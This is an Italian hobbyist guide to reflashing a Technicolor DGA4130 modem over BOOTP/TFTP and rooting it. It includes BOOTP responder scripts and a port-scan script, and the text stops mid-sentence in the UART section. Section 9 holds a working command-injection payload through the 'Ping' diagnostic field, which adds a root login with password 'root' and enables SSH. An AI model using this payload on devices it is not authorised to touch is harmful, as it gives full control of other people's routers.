# Recovery via BOOTP/TFTP (U-Boot) per Technicolor DGA4130 / VBNT-K

Questo documento descrive, passo per passo, come abbiamo aggirato un blocco della
procedura standard di root (guida su forum.fibra.click / ilpuntotecnico.com,
tool AutoFlashGUI di Mark Smith) usando invece il meccanismo di **recovery
BOOTP/TFTP del bootloader U-Boot**, documentato genericamente su
[hack-technicolor.readthedocs.io/Recovery](https://hack-technicolor.readthedocs.io/en/stable/Recovery/)
ma qui adattato/reso robusto per Windows con script scritti da zero, perché gli
strumenti "consigliati" (Tftpd64) da soli non bastavano su questo specifico
setup.

**Vale per:** Technicolor DGA4130 "TIM Smart Modem Plus" (nome interno board:
**VBNT-K**, confermato dal campo "Boot file name" nelle sue richieste BOOTP e
dalla issue pubblica [hack-technicolor#235](https://github.com/hack-technicolor/hack-technicolor/issues/235)).
Con gli stessi accorgimenti dovrebbe valere per DGA4132/Fastgate.

**Perché serve questa strada alternativa:** il percorso "ufficiale" (AutoFlashGUI
via HTTP contro l'interfaccia web del modem) può fallire con errori del tipo
`ChunkedEncodingError: Response ended prematurely` in modo sistematico (non
intermittente) quando si è collegati via cavo diretto (senza switch in mezzo)
a un dispositivo embedded. La causa più probabile è il **TCP/UDP checksum
offload** della scheda di rete del PC (vedi sezione dedicata sotto). La
recovery BOOTP/TFTP del bootloader bypassa del tutto HTTP: scarica un file
`.rbi` **firmato** via TFTP subito dopo il power-on, quindi non soffre dello
stesso problema (anche se, come vedremo, il vero blocco era altrove).

## Requisiti

- Windows 10/11 con una porta Ethernet libera collegata **direttamente** al
  modem (niente switch in mezzo, se possibile — semplifica la diagnosi).
- Python 3 (qualunque versione recente) con un virtualenv che abbia già i
  pacchetti richiesti da AutoFlashGUI (`robobrowser`) — in questo progetto si
  è riusato il venv già presente in `autoflashgui-master/.venv`.
- [Tftpd64](https://github.com/PJO2/tftpd64) (edizione portable, nessun
  installer necessario) — usato **solo** come server TFTP, non come server
  DHCP/BOOTP (vedi perché sotto).
- Un file firmware `.rbi` "di tipo 2" valido per il tuo modem (scaricato dal
  repository hack-technicolor, sezione Firmware Repository).
- Privilegi di amministratore sul PC (per IP statico, disattivazione offload
  di rete, regole firewall).
- **Wireshark** fortemente consigliato per la diagnosi — è stato lo strumento
  decisivo per capire cosa succedeva davvero sul cavo quando le applicazioni
  Windows non vedevano nulla.

## Panoramica dei passaggi

1. Isolare fisicamente il collegamento PC↔modem dal resto della rete di casa.
2. Sistemare la rete del PC (IP statico, offload di rete, firewall, categoria
   rete, eventuale VPN) — questa è la parte più insidiosa, vedi sotto.
3. Avviare Tftpd64 (solo TFTP) + uno script Python dedicato per rispondere
   alle richieste BOOTP (necessario, Tftpd64 da solo non bastava — vedi
   perché).
4. Procedura fisica sul modem: power-cycle con reset tenuto premuto, per
   entrare nella modalità di recovery del bootloader.
5. Verificare che il trasferimento TFTP del firmware sia completato.
6. Aspettare che il modem scriva in flash e si riavvii **da solo** (fase più
   delicata: non toccare l'alimentazione).
7. Tornare sull'IP normale del modem (`192.168.1.1`) e verificare l'interfaccia
   web.
8. Lanciare il passaggio di root vero e proprio (AutoFlashGUI, qui reso
   headless/senza GUI).

---

## 1. Isolamento fisico

Se il modem ha altri dispositivi collegati (altre porte LAN, WiFi), il suo
switch interno inoltra i broadcast (compresi i nostri DHCP/BOOTP fasulli)
anche verso di loro. Un server DHCP "canaglia" sulla stessa rete di casa può
far perdere temporaneamente la connessione a dispositivi altrui (telefoni,
TV, altri PC) che ricevono un indirizzo dal nostro pool invece che dal
router vero.

**Prima di iniziare:** scollega dal modem tutti i cavi tranne quello verso
il PC che farà da server di recovery, e se possibile disattiva il WiFi del
modem (se hai già accesso alla sua interfaccia; altrimenti accetta il rischio
minore di interferenza sui client WiFi per la durata della procedura).

## 2. Configurazione di rete del PC — e le insidie trovate

### 2.1 IP statico

Il bootloader in modalità BOOTP fa da *client* DHCP/BOOTP: il PC deve fare da
server. Serve un IP statico sulla scheda usata, in una subnet dedicata (qui
si è usato `10.0.0.99/24`, **senza gateway** — è un collegamento punto-punto,
non serve instradare altrove):

```powershell
Remove-NetIPAddress -InterfaceIndex <IDX> -Confirm:$false
New-NetIPAddress -InterfaceIndex <IDX> -IPAddress 10.0.0.99 -PrefixLength 24
```

(`<IDX>` = `ifIndex` della scheda, si trova con `Get-NetAdapter`.)

Va rifatto ogni volta che si torna a parlare con il modem sul suo IP
"normale" (`192.168.1.1/24`) per la fase web, e poi di nuovo su `10.0.0.99`
se serve un secondo giro di recovery.

**Attenzione ai residui:** se prima avevi provato configurazioni diverse
(es. per un altro tool che richiede `58.162.0.1/24` come gateway, vedi
`tch-exploit` più sotto), assicurati di **rimuovere le vecchie rotte di
default** (`Get-NetRoute -DestinationPrefix 0.0.0.0/0`) — una rotta residua
verso un gateway sbagliato non impedisce il traffico locale ma è comunque
sporcizia da ripulire, ed è facile dimenticarla dopo vari cambi di IP nella
stessa sessione.

### 2.2 Checksum offload — la causa nascosta del problema originale

**Questo è stato il blocco più subdolo di tutta la procedura**, ed è
probabilmente anche la causa originale del fallimento di AutoFlashGUI via
HTTP (`ChunkedEncodingError`).

Le schede di rete moderne calcolano i checksum TCP/UDP in hardware
("offload"), invece che lasciarli calcolare alla CPU/allo stack di rete di
Windows. Su un collegamento diretto punto-punto verso un device embedded
(niente switch di mezzo a "ripulire" eventuali pacchetti border-line), può
capitare che pacchetti UDP/TCP che il device embedded considera validi
vengano invece scartati **dall'hardware della scheda di rete del PC prima
ancora di arrivare allo stack Windows** — quindi anche prima di qualunque
firewall o applicazione.

**Sintomo:** Wireshark (che cattura a livello driver/NDIS via Npcap, PRIMA
della eventuale validazione hardware) vede tutti i pacchetti regolarmente;
**nessuna applicazione Windows** (Tftpd64, uno script Python con socket
normali) li vede mai, anche con firewall configurato correttamente. Questo
mismatch — "Wireshark vede tutto, nessuno riceve nulla" — è il segnale
diagnostico chiave.

**Fix:**

```powershell
Set-NetAdapterAdvancedProperty -Name "Ethernet" -DisplayName "IPv4 Checksum Offload" -DisplayValue "Disabled"
Set-NetAdapterAdvancedProperty -Name "Ethernet" -DisplayName "TCP Checksum Offload (IPv4)" -DisplayValue "Disabled"
Set-NetAdapterAdvancedProperty -Name "Ethernet" -DisplayName "UDP Checksum Offload (IPv4)" -DisplayValue "Disabled"
Set-NetAdapterAdvancedProperty -Name "Ethernet" -DisplayName "Large Send Offload v2 (IPv4)" -DisplayValue "Disabled"
```

Verificare con:

```powershell
Get-NetAdapterAdvancedProperty -Name "Ethernet" | Where-Object {$_.DisplayName -match "Checksum|Offload|Large Send"}
```

**Nota:** questi settaggi sono persistiti correttamente attraverso i vari
power-cycle del modem nella nostra sessione — non serve riapplicarli a ogni
tentativo, ma vale la pena riverificarli se qualcosa smette misteriosamente
di funzionare dopo un cambio di stato della rete.

### 2.3 Categoria di rete (Public vs Private) e Windows Firewall

Windows classifica ogni nuova connessione come "Public", "Private" o
"Domain". Su un collegamento diretto a un device sconosciuto, spesso resta
su **"Unidentified network" → Public** di default — categoria su cui il
firewall blocca il traffico in ingresso non richiesto in modo molto più
aggressivo, **spesso senza nemmeno mostrare il popup di richiesta permesso**
per un'applicazione che prova ad ascoltare su una porta.

Verifica:

```powershell
Get-NetConnectionProfile -InterfaceAlias Ethernet | Select NetworkCategory, IPv4Connectivity
```

Fix (richiede amministratore):

```powershell
Set-NetConnectionProfile -InterfaceIndex <IDX> -NetworkCategory Private
```

**Attenzione:** ogni volta che il link fisico cade e si rialza (es. ogni
power-cycle del modem), Windows può ri-creare un nuovo oggetto "profilo di
rete" per la stessa scheda, che torna a "Public" di default. **Va
riverificato/riapplicato dopo ogni power-cycle**, non è una modifica
"una volta per tutte" — questo ci ha fatto perdere tempo più di una volta.

Anche con categoria Private, conviene aggiungere una regola esplicita per
l'applicazione/porta usata, invece di fare affidamento solo sulla categoria:

```powershell
New-NetFirewallRule -DisplayName "NomeRegola" -Direction Inbound `
  -Program "C:\percorso\completo\programma.exe" -Protocol UDP -LocalPort 67,69 `
  -Action Allow -Profile Any
```

**Importante:** la regola è **specifica per programma** (`-Program`). Se usi
sia Tftpd64 sia uno script Python personalizzato, servono **due regole
distinte** (una per `tftpd64.exe`, una per `python.exe` — il path esatto
dell'interprete usato, es. quello dentro un venv), altrimenti il secondo
programma resta silenziosamente bloccato mentre il primo funziona,
confondendo la diagnosi (sembra un problema del programma, è solo il
firewall).

### 2.4 Interferenza di client VPN

Se hai un client VPN installato (Surfshark, NordVPN, ecc.), il suo servizio
può restare **attivo anche da disconnesso** e installare filtri di rete a
basso livello (kill-switch/anti-leak) che intercettano traffico "insolito"
(broadcast UDP con IP sorgente 0.0.0.0, tipico di BOOTP) **prima** che
arrivi alle regole del Windows Firewall che hai configurato tu — quindi le
tue regole "Allow" non bastano a farlo passare comunque.

Diagnosi:

```powershell
Get-Process | Where-Object {$_.ProcessName -match 'surfshark|nordvpn|openvpn|wireguard'}
Get-Service  | Where-Object {$_.DisplayName -match 'VPN'}
```

Fix temporaneo (si riavvia da solo, nessun danno permanente):

```powershell
Stop-Service -Name "Surfshark Service" -Force
```

Nella nostra sessione questo **non è risultato essere la causa reale** del
blocco (il vero colpevole era il checksum offload, sezione 2.2), ma è un
sospetto ragionevole da controllare presto nella diagnosi se il traffico
non arriva nonostante tutto il resto sia a posto — costa poco escluderlo.

### 2.5 Diagnosi via `pktmon` (se serve capire *dove* un pacchetto viene scartato)

Windows ha uno strumento integrato, `pktmon`, che può mostrare (a differenza
di Wireshark, che cattura "prima" di ogni decisione del sistema) *se e dove*
un pacchetto viene scartato lungo lo stack — utile quando Wireshark vede
tutto ma nessuna applicazione riceve nulla, per distinguere rapidamente tra
"offload scarta in hardware" e "firewall/WFP scarta più in alto". Richiede
amministratore. Esempio minimale:

```powershell
pktmon filter remove
pktmon filter add -p 67
pktmon start --etw -f trace.etl
# ... genera traffico ...
pktmon stop
pktmon etl2txt trace.etl -o trace.txt
```

Nella pratica qui non è servito arrivare fino in fondo con questo strumento
(la causa è stata trovata prima, per esclusione), ma resta un'arma buona da
tenere a mente se la diagnosi via Wireshark + tentativi mirati non basta.

---

## 3. Perché serve uno script BOOTP dedicato (Tftpd64 da solo non bastava)

La guida generica di hack-technicolor consiglia **Tftpd64** anche come
server DHCP/BOOTP, non solo TFTP. Nella pratica, con questo modem, **Tftpd64
non ha mai risposto alle sue richieste BOOTP**, pur avendo la casella
"DHCP Server" spuntata nelle Settings e pur ricevendo/rispondendo
correttamente a richieste DHCP *standard* di altri dispositivi sulla stessa
rete (prova che il servizio DHCP di Tftpd64 funzionava in generale).

**Causa sospetta:** la richiesta del modem è **BOOTP legacy puro** (RFC 951),
cioè **priva dell'opzione DHCP 53 "Message Type"** che la maggior parte dei
client DHCP moderni includono sempre. È plausibile che l'implementazione
DHCP di Tftpd64 riconosca come "richiesta valida" solo pacchetti con quella
opzione, e scarti silenziosamente (senza loggare nulla, nemmeno un errore)
richieste BOOTP "nude" come questa.

**Soluzione:** uno script Python dedicato, scritto da zero, che risponde a
*qualunque* BOOTREQUEST (op=1) indipendentemente dalle opzioni presenti.

### 3.1 Prima versione — socket Python "nudi" (parzialmente funzionante)

Prima versione con `socket` standard di Python. **Funziona meglio di
Tftpd64** (riceve e risponde), ma soffre di **perdita di pacchetti
intermittente** anche con gli offload disattivati — su una raffica di ~49
richieste BOOTP del modem, ne riceveva solo 1-2. Utile come primo passo
diagnostico, ma non abbastanza affidabile per l'uso reale.

```python
import socket

SERVER_IP = "10.0.0.99"
OFFER_IP = "10.0.0.150"
FALLBACK_FILE = "VBNT-K"

def ip_to_bytes(ip):
    return socket.inet_aton(ip)

def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    sock.bind(("0.0.0.0", 67))

    while True:
        data, addr = sock.recvfrom(2048)
        if len(data) < 236 or data[0] != 1:
            continue  # non e' una BOOTREQUEST

        htype = data[1]
        hlen = data[2]
        xid = data[4:8]
        flags = data[10:12]
        chaddr = data[28:44]
        req_file = data[108:236].split(b"\x00")[0].decode(errors="ignore")

        reply_file = (req_file or FALLBACK_FILE).encode()[:128].ljust(128, b"\x00")

        # IMPORTANTE: costruire il buffer SENZA padding extra prima delle
        # opzioni — un bug iniziale creava un bytearray(300) e poi
        # APPENDEVA le opzioni dopo, lasciando 60 byte di zeri di troppo
        # tra il magic cookie e le opzioni vere. Il buffer fisso BOOTP
        # e' di 236 byte + 4 byte di magic cookie = 240; le opzioni vanno
        # SUBITO dopo.
        reply = bytearray(240)
        reply[0] = 2  # BOOTREPLY
        reply[1] = htype
        reply[2] = hlen
        reply[4:8] = xid
        reply[10:12] = flags
        reply[16:20] = ip_to_bytes(OFFER_IP)   # yiaddr
        reply[20:24] = ip_to_bytes(SERVER_IP)  # siaddr (next-server per TFTP)
        reply[28:44] = chaddr
        reply[108:236] = reply_file
        reply[236:240] = bytes([99, 130, 83, 99])  # magic cookie RFC1048

        opts = bytes([1, 4]) + ip_to_bytes("255.255.255.0") + bytes([255])
        reply += opts

        sock.sendto(bytes(reply), ("255.255.255.255", 68))

if __name__ == "__main__":
    main()
```

### 3.2 Versione definitiva — scapy/Npcap (affidabile)

Dato che **Wireshark** (che usa Npcap) vedeva sempre e comunque il 100% dei
pacchetti anche quando i socket Windows ne perdevano la maggioranza, la
soluzione è stata bypassare completamente lo stack socket standard di
Windows e usare **la stessa libreria di cattura di Wireshark** anche per
inviare/ricevere: [`scapy`](https://scapy.net/), che su Windows si appoggia
a Npcap.

```powershell
pip install scapy
```

(Richiede che [Npcap](https://npcap.com/) sia già installato — se hai
Wireshark installato, ce l'hai già.)

```python
import socket
from scapy.all import sniff, sendp, get_if_hwaddr
from scapy.layers.l2 import Ether
from scapy.layers.inet import IP, UDP
from scapy.layers.dhcp import BOOTP

IFACE = "Ethernet"          # nome scapy/Npcap della scheda
SERVER_IP = "10.0.0.99"
OFFER_IP = "10.0.0.150"
FALLBACK_FILE = "VBNT-K"

MY_MAC = get_if_hwaddr(IFACE)

def handle(pkt):
    if not pkt.haslayer(BOOTP) or pkt[BOOTP].op != 1:
        return
    bootp = pkt[BOOTP]
    mac = pkt[Ether].src
    req_file = bytes(bootp.file).split(b"\x00")[0].decode(errors="ignore")
    reply_file = (req_file or FALLBACK_FILE).encode()[:128]

    # NOTA / bug noto non ancora corretto in questa versione: manca il
    # magic cookie RFC1048 nel campo "options" — Wireshark segnalera'
    # questa risposta come "Malformed Packet". Non e' bloccante: il
    # client U-Boot minimale del modem legge solo i campi fissi
    # (yiaddr/siaddr/file) e ignora le opzioni vendor malformate, quindi
    # il trasferimento TFTP funziona comunque. Per correttezza andrebbe
    # comunque anteposto bytes([99,130,83,99]) a "opts" qui sotto.
    opts = bytes([1, 4]) + socket.inet_aton("255.255.255.0") + bytes([255])

    reply = (
        Ether(dst=mac, src=MY_MAC)
        / IP(src=SERVER_IP, dst="255.255.255.255")
        / UDP(sport=67, dport=68)
        / BOOTP(
            op=2, htype=bootp.htype, hlen=bootp.hlen, xid=bootp.xid,
            secs=0, flags=bootp.flags, ciaddr="0.0.0.0",
            yiaddr=OFFER_IP, siaddr=SERVER_IP, giaddr="0.0.0.0",
            chaddr=bootp.chaddr, sname=b"", file=reply_file, options=opts,
        )
    )
    sendp(reply, iface=IFACE, verbose=False)
    print(f"BOOTREPLY inviata a {mac}: yiaddr={OFFER_IP} file={reply_file}")

sniff(iface=IFACE, filter="udp and (port 67 or port 68)", prn=handle, store=False)
```

Questa versione ha ricevuto e risposto **in modo affidabile** a tutte le
richieste del modem osservate. Non richiede privilegi di amministratore per
girare (Npcap in modalità compatibile lo permette), ma **richiede comunque
che gli offload di rete siano disattivati** (sezione 2.2) — bypassare il
socket standard di Windows non basta se il pacchetto viene scartato ancora
prima, dall'hardware della scheda.

### 3.3 Il nome del file richiesto

Il campo "Boot file name" della richiesta BOOTP del modem contiene
**già** il nome del file che si aspetta (nel nostro caso, letteralmente
`VBNT-K`, il nome interno della board) — non è detto che coincida con il
nome del tuo file `.rbi` scaricato. Due strade:

1. (Usata sopra) Far sì che lo script echeggi nel campo "file" della
   risposta lo stesso nome ricevuto nella richiesta.
2. **Più semplice e robusto**: creare nella cartella servita da TFTP una
   copia del file `.rbi` con il nome esatto richiesto (es. `VBNT-K`, senza
   estensione) — il server TFTP serve qualunque file trovi con quel nome,
   indipendentemente da cosa mettiamo nell'opzione DHCP/BOOTP:

   ```powershell
   Copy-Item "AGTEF_1.0.3_CLOSED.rbi" "VBNT-K"
   ```

## 4. Configurazione di Tftpd64 (solo TFTP)

Con lo script Python che gestisce BOOTP sulla porta 67, **Tftpd64** va
usato **solo** per il servizio TFTP (porta 69) — se entrambi restano attivi
sulla porta 67 contemporaneamente (`SO_REUSEADDR` permette il doppio bind su
Windows), Windows consegna ogni pacchetto a un solo processo in modo
imprevedibile, il che sembra un problema intermittente ma è in realtà un
conflitto di porta.

**Nelle Settings di Tftpd64, togliere la spunta a "DHCP Server"**, lasciare
solo "TFTP Server" (e "Syslog Server" se vuoi il log).

File `tftpd32.ini` di riferimento (sezione TFTP; la sezione `[DHCP]` non è
più necessaria con questa configurazione dato che il BOOTP è gestito dallo
script):

```ini
[TFTPD32]
BaseDirectory=C:\percorso\alla\cartella\con\i\firmware
TftpPort=69
LocalIP=10.0.0.99
```

Verifica che le porte siano assegnate correttamente **una per processo**:

```powershell
netstat -ano -p UDP | findstr ":67 :69"
```

Dovresti vedere **un solo PID** sulla 67 (lo script Python) e **un solo PID**
sulla 69 (Tftpd64).

## 5. Procedura fisica sul modem

1. Stacca l'alimentazione del modem.
2. Tieni premuto il tasto reset posteriore.
3. Ridai alimentazione **tenendo reset premuto**.
4. Osserva i LED; rilascia reset dopo qualche secondo (la timing esatta non
   è documentata per questo modello specifico — un valore nell'ordine di
   8-10 secondi dall'accensione ha funzionato).

Il bootloader U-Boot fa un tentativo di BOOTP molto presto nel boot (nella
nostra cattura, il traffico iniziava a comparire quasi subito dopo
l'accensione, con retry ogni ~1 secondo per diversi secondi prima di
rinunciare e proseguire con il boot normale se nessuno risponde).

## 6. Verifica del trasferimento

Nella finestra principale di Tftpd64 compare un log del tipo:

```
Connection received from 10.0.0.150 on port 2332
Read request for file <VBNT-K>. Mode octet
Using local port 61071
<VBNT-K>: sent 51577 blks, 26407355 bytes in 14 s. 1 blk resent
```

Il numero di byte deve combaciare esattamente con la dimensione del file
`.rbi` originale. "1 blk resent" (o pochi) è normale; molti blocchi
ritrasmessi indicherebbero un problema di rete ancora presente.

In Wireshark, la sequenza completa attesa è:

```
BOOTP  Boot Request from <mac modem>
BOOTP  Boot Reply [Malformed Packet]     <- nostra risposta (vedi nota 3.2)
ARP    Announcement for <IP offerto>     <- il modem rivendica l'IP
ARP    Who has <IP server>? Tell <IP offerto>
TFTP   Read Request, File: <nome>, Transfer type: octet
TFTP   Data Packet, Block: 1
TFTP   Acknowledgement, Block: 1
...    (blocchi successivi fino al completamento)
```

## 7. Dopo il trasferimento: NON toccare l'alimentazione

Questa è la fase più delicata e rischiosa di tutta la procedura: il modem
sta scrivendo il firmware ricevuto nella memoria flash. **Un'interruzione
di corrente in questo momento è la causa più comune di brick reale e
irreversibile** (a differenza di quasi tutto il resto di questa procedura,
che è recuperabile). Aspetta alcuni minuti che si riavvii da solo.

## 8. Tornare sull'IP normale e verificare l'interfaccia web

```powershell
Remove-NetIPAddress -InterfaceIndex <IDX> -Confirm:$false
New-NetIPAddress -InterfaceIndex <IDX> -IPAddress 192.168.1.2 -PrefixLength 24 -DefaultGateway 192.168.1.1
```

Verifica rapida che il modem risponda e che l'interfaccia web sia
effettivamente **renderizzata** (non solo raggiungibile):

```python
import requests
r = requests.get("http://192.168.1.1/", timeout=10)
print(r.status_code, len(r.content))
print(r.text[:300])
```

**Cosa guardare:** se nella risposta vedi frammenti di codice tipo
`ngx.print(...)` invece di HTML vero, il webserver nginx+lua del modem
**non sta eseguendo le pagine**, le sta servendo come testo grezzo — un
problema che abbiamo riscontrato in modo riproducibile con il firmware
1.0.3 su questo hardware specifico (stesso risultato anche dopo un
power-cycle pulito e dopo un secondo flash identico da zero). Blocca
qualunque autenticazione web (niente token CSRF valido) e quindi anche il
passaggio di root del punto successivo. **Non abbiamo ancora una soluzione
per questo specifico problema** — vedi la sezione "Problema aperto" in
fondo.

## 9. Il passaggio di root vero e proprio (AutoFlashGUI headless)

Una volta che l'interfaccia web **renderizza correttamente** (verificato
come sopra), il root si ottiene con la stessa tecnica della guida
originale: autenticazione SRP6 contro il pannello web, poi iniezione di
comandi shell tramite il campo "Ping" della pagina diagnostica (un classico
command injection su `pingAddr` — vedi anche
[CVE-2017-14127](https://github.com/advisories/GHSA-mm3f-7647-5r4p) per lo
stesso tipo di vulnerabilità su altri Technicolor).

AutoFlashGUI (Mark Smith, GPLv3) implementa già tutto questo, ma solo dietro
una GUI Tkinter. La funzione che fa il lavoro vero,
`libautoflashgui.mainScript(...)`, è una funzione Python pura — richiamabile
direttamente senza aprire nessuna finestra:

```python
import socket, sys, os

sys.path.insert(0, r"F:\Modem\autoflashgui-master")
os.chdir(r"F:\Modem\autoflashgui-master")

import liblang, libautoflashgui

socket.setdefaulttimeout(5)
liblang.init_language(sys.argv, sys.path, None)
libautoflashgui.init_language(sys.argv, sys.path, None)

HOST = "192.168.1.1"
USERNAME = b"admin"
PASSWORD = b"admin"
METHOD = "Ping"              # vedi defaults.ini per i metodi/variant pronti
DDNS_SERVICE = "dyndns.com"
COMMAND = (
    "sed -i '1croot:x:0:0:root:/root:/bin/ash' /etc/passwd;"
    "uci set dropbear.@dropbear[0].RootPasswordAuth='on';"
    "uci set dropbear.@dropbear[0].enable='1';"
    "uci commit;"
    'echo -e "root\\nroot"|passwd;'
    "/etc/init.d/dropbear restart"
)

result = libautoflashgui.mainScript(
    HOST, USERNAME, PASSWORD,
    False, "",          # flashFirmware=False: qui NON si flasha, si vuole solo il root
    120,                 # flashSleepDelay (inutilizzato se flashFirmware=False)
    METHOD, COMMAND,
    True,                # splitCommand: spezza il comando su ';' con pausa tra un pezzo e l'altro
    DDNS_SERVICE,
    5, 5,                # connectRetryDelay, interCommandDelay (secondi)
)
print(result)
```

Il file `defaults.ini` di AutoFlashGUI contiene già un profilo pronto per
questa combinazione esatta di modello/firmware:

```ini
variant=DGA4130 TIM AGTEF_1.0.3,Ping,dyndns.com,sed -i '1croot:x:0:0:root:/root:/bin/ash' /etc/passwd;uci set dropbear.@dropbear[0].RootPasswordAuth='on';uci set dropbear.@dropbear[0].enable='1';uci commit;echo -e "root\nroot"|passwd;/etc/init.d/dropbear restart
```

(formato riga: `variant=<nome>,<metodo Ping|AdvancedDDNS|BasicDDNS>,<ddns service>,<comando/i separati da ;>`)

**Importante:** questo profilo specifico è tarato per il firmware **1.0.3**.
Non c'è garanzia che lo stesso comando funzioni su versioni più recenti
(2.2.0/2.2.1): sono proprio le versioni più vecchie a essere scelte apposta
perché note per essere vulnerabili a questa tecnica; versioni successive
potrebbero aver chiuso il buco. Verificato: un utente con firmware 2.2.1 sul
forum originale non è riuscito a rootare con le strategie standard.

Dopo un'esecuzione riuscita, il modem risponde su SSH:

```powershell
$securePw = ConvertTo-SecureString "root" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("root", $securePw)
$session = New-SSHSession -ComputerName 192.168.1.1 -Credential $cred -AcceptKey -Force
Invoke-SSHCommand -SSHSession $session -Command "id"
```

Da qui in poi prosegue lo script `Root-DGA4130.ps1` di questo stesso repo,
che automatizza swap di bank, upload firmware via SCP, parsing bli_parser/
bli_unseal, scrittura di un `rc.local` persistente, secondo flash, e
installazione della GUI Ansuel (`GUI.tar.bz2`).

## 10. Problema aperto (non risolto, ancora in corso)

Con il firmware `AGTEF_1.0.3_CLOSED.rbi`, **riprodotto due volte** con
flash indipendenti (stessa procedura, stesso file), il webserver del
modem post-flash serve tutte le pagine `.lp` (`/`, `/login.lp`,
`/modals/gateway-modal.lp`) come **codice Lua grezzo non eseguito**
(byte-per-byte identico tra i tentativi — non è un problema di timing/boot
lento, verificato anche dopo un power-cycle pulito senza toccare la
flash). Questo impedisce qualunque autenticazione web e quindi il
passaggio di root del punto 9.

### 10.1 Diagnosi ulteriore: HTTPS pulito, portscan, captive portal

Per capire se il problema fosse di nginx in generale o solo del vhost HTTP
su `.lp`, si sono fatti altri controlli:

**HTTPS (porta 443) risponde in modo pulito** — nginx genera un 404
correttamente formattato per `/` e per tutte le stesse pagine `.lp` provate
su HTTP:

```python
import requests
requests.packages.urllib3.disable_warnings()
r = requests.get('https://192.168.1.1/', timeout=10, verify=False)
# -> 200... anzi 404, 162 byte, HTML vero:
# <html><head><title>404 Not Found</title></head><body...><center>nginx</center></body></html>
```

Questo dimostra che **nginx stesso funziona correttamente** e sa generare
risposte normali — il problema è isolato al modo in cui il vhost/location
di **HTTP** (porta 80) gestisce le richieste `.lp`: le trova (200, non 404)
ma non le esegue attraverso l'interprete lua, le serve come file di testo
grezzo. Su HTTPS invece le stesse identiche richieste danno 404 pulito
(nginx non trova nessuna route per `.lp` su quel vhost — è semplicemente un
vhost diverso/più scarno, non è la "cura").

**Portscan completo** (Python, socket raw, concorrenza bassa — un primo
tentativo con 200 thread paralleli e timeout 0.4s ha dato risultati falsi
negativi per esaurimento risorse sul piccolo stack TCP del device embedded;
con 20 thread e timeout 1.5s il risultato è stabile e ripetibile):

```python
import socket, concurrent.futures

target = '192.168.1.1'
ports = list(range(1,1025)) + [1900,2000,5000,5555,7547,8080,8081,8443,8888,9000,9999,49152,49153,49154,50000]

def check(p):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(1.5)
    try:
        return p if s.connect_ex((target, p)) == 0 else None
    finally:
        s.close()

with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
    open_ports = [p for p in ex.map(check, ports) if p]
print(sorted(open_ports))
# -> [22, 53, 80, 443, 8080, 49152]
```

**Porta 8080 = captive portal "INTERCEPT TEST"**:

```
GET http://192.168.1.1:8080/  ->  200, 421 byte
<html><head></head><body><center><p><b>INTERCEPT TEST</b></p>
You have been intercepted for the following destin[azione]...
```

Questa è tipica dei CPE degli operatori italiani (TIM incluso): un
meccanismo di intercettazione che scatta quando il modem **non risulta
ancora "provisionato"** (non ha completato l'handshake con il server
ACS/TR-069 dell'operatore via WAN). Molti CPE bloccati dall'operatore
limitano deliberatamente anche funzionalità dell'interfaccia di gestione
LAN finché il dispositivo non risulta attivato, come misura
anti-manomissione/anti-uso-non-autorizzato.

**Ipotesi principale aggiornata:** la mancata renderizzazione Lua potrebbe
essere legata proprio a questo stato "non provisionato" — e il cavo VDSL
è scollegato per **tutta** questa procedura (prerequisito esplicito della
guida originale, per evitare che l'operatore aggiorni/rilocki il modem
durante la finestra di root). Se questo modem lega la piena funzionalità
della UI LAN al fatto di avere un WAN/provisioning attivo, la UI resterebbe
azzoppata finché il VDSL resta staccato — cosa che pero' e' in
**contraddizione diretta** con un prerequisito di sicurezza fondamentale
della procedura di root stessa. Non è stato ancora testato riconnettendo
il VDSL, proprio per questo trade-off rischio/beneficio (rischio di
re-provisioning/blocco lato operatore durante la finestra di root vs.
possibile fix della UI) — è una decisione che va presa consapevolmente,
non a caso.

**Aggiornamento — ipotesi del provisioning SMENTITA:** si è riconnesso il
cavo VDSL e atteso che il modem completasse la sincronizzazione/i suoi
cicli di riavvio (osservati con un monitor dedicato: diverse fasi di
502/503/timeout di connessione, poi assestamento). Al termine, la webUI è
tornata **esattamente allo stesso stato rotto** (Lua grezzo). Si è poi
provato anche il **vero hard-reset da manuale ufficiale** (§11 sotto: 7
secondi sul pulsante Reset a modem acceso, diverso dal power-cycle con
reset tenuto usato per la recovery BOOTP) — stesso risultato identico.
In totale **quattro eventi di reboot indipendenti** (due reflash via
BOOTP/TFTP, un riavvio dopo riconnessione VDSL, un hard-reset ufficiale)
riproducono tutti lo stesso identico sintomo. Questo esclude con buona
sicurezza sia il provisioning WAN sia uno stato/overlay corrotto
temporaneo come causa: è quasi certamente un difetto strutturale di
questo firmware (1.0.3) su questa specifica revisione hardware, non
qualcosa risolvibile con reset/riavvii/riconnessioni.

Altre ipotesi non ancora verificate, in ordine di plausibilità decrescente:
- **(principale, sopra)** Stato "non provisionato"/captive-portal che
  limita anche la UI LAN in assenza di WAN attivo.
- Il percorso di recovery BOOTP/TFTP scrive "bootfs+rootfs" ma non
  ricostruisce/inizializza una cache o un componente che il normale
  meccanismo di sysupgrade firmato invece rigenera al primo boot.
- Il firmware 1.0.3 specifico ha un bug noto su questa revisione hardware
  (da verificare nella community: hack-technicolor GitHub issues, forum
  fibra.click/ilpuntotecnico).
- Serve un vero factory-reset (combinazione tasti diversa da quella usata
  per la recovery BOOTP) per pulire un overlay/config persistente
  incompatibile.

Non risolvibile da remoto senza accesso seriale/UART al dispositivo, che
darebbe visibilità diretta sui log di boot e sullo stato dei servizi
nginx/lua — oppure, in alternativa più economica ma rischiosa, riconnettendo
il VDSL per testare l'ipotesi del provisioning (vedi sopra).

### 10.3 Accesso UART — fatto, ma senza sblocco

Collegato un adattatore USB-UART (CP2102, 115200 8N1) alle piazzole TX/RX/GND
sulla scheda. Confermato funzionamento **bidirezionale**:

- **Ricezione**: log di boot completo catturato (BootROM secure boot →
  U-Boot Broadcom → kernel Linux 4.1.38 → userspace), incluso il
  sotto-sistema WiFi Quantenna (log separato, prefisso `[Quantenna]`, CPU
  dedicata con proprio firmware).
- **Invio**: confermato funzionante ma **serve persistenza** — il prompt
  `*** Press b to enter BOOT-P ***` del bootloader ha una finestra di
